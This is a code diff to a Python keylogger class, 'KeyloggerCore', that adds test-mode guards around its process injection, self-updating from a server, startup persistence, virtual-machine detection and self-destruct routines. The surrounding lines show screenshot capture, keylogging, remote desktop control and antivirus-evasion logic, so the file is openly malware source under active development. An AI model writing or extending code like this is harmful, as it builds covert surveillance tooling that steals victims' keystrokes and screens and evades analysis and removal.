@@ -60,7 +60,6 @@ class KeyloggerCore:
             self.rdp_controller = RDPController(self.encryption)
             self.running = True
             self.anti_av = AntiAV()
-            self.running = True
             self.behavior = {
                 "screenshot_enabled": True,
                 "keylogging_enabled": True,
@@ -72,12 +71,13 @@ class KeyloggerCore:
 
             self.adjust_behavior_based_on_antivirus()
 
-            if platform.system().lower() == "windows" and not Config.DEBUG_MODE and self.behavior["process_injection_enabled"]:
-                self.attempt_process_injection()
+            if not Config.TEST_MODE:  # Skip dangerous operations in test mode
+                if platform.system().lower() == "windows" and not Config.DEBUG_MODE and self.behavior["process_injection_enabled"]:
+                    self.attempt_process_injection()
 
-            self.check_for_updates()
-            self.check_vm_environment()
-            self.add_to_startup()
+                self.check_for_updates()
+                self.check_vm_environment()
+                self.add_to_startup()
 
         except Exception as e:
             if Config.DEBUG_MODE:
@@ -151,7 +151,8 @@ class KeyloggerCore:
             if version.parse(server_version) > version.parse(Config.CLIENT_VERSION):
                 if Config.DEBUG_MODE:
                     logging.info(f"New version {server_version} available. Downloading from {download_url}")
-                self.update_client(download_url, server_version)
+                if not Config.TEST_MODE:  # Skip update in test mode
+                    self.update_client(download_url, server_version)
             else:
                 if Config.DEBUG_MODE:
                     logging.info("Client is up-to-date.")
@@ -212,7 +213,7 @@ class KeyloggerCore:
         except Exception as e:
             if Config.DEBUG_MODE:
                 logging.error(f"Failed to upload VM status: {str(e)}")
-        if vm_details["is_vm"] and not Config.DEBUG_MODE:
+        if not Config.TEST_MODE and vm_details["is_vm"] and not Config.DEBUG_MODE:  # Skip self-destruct in test mode
             if Config.DEBUG_MODE:
                 logging.warning("Virtual Machine detected. Initiating self-destruct.")
             self.self_destruct()
@@ -230,12 +231,13 @@ class KeyloggerCore:
             except Exception as e:
                 if Config.DEBUG_MODE:
                     logging.error(f"Failed to send self-destruct report: {str(e)}")
-            self.remove_from_startup()
-            self.cleanup_files()
-            self.delete_executable()
-            if Config.DEBUG_MODE:
-                logging.info("Self-destruct complete. Terminating process.")
-            sys.exit(0)
+            if not Config.TEST_MODE:  # Skip file deletion in test mode
+                self.remove_from_startup()
+                self.cleanup_files()
+                self.delete_executable()
+                if Config.DEBUG_MODE:
+                    logging.info("Self-destruct complete. Terminating process.")
+                sys.exit(0)
         except Exception as e:
             if Config.DEBUG_MODE:
                 logging.error(f"Self-destruct error: {str(e)}")
@@ -302,7 +304,8 @@ class KeyloggerCore:
         self.running = False
         if Config.DEBUG_MODE:
             logging.error("Emergency stop initiated")
-        self.self_destruct()
+        if not Config.TEST_MODE:  # Skip self-destruct in test mode
+            self.self_destruct()
 
     def start(self):
         self._init_hotkeys()
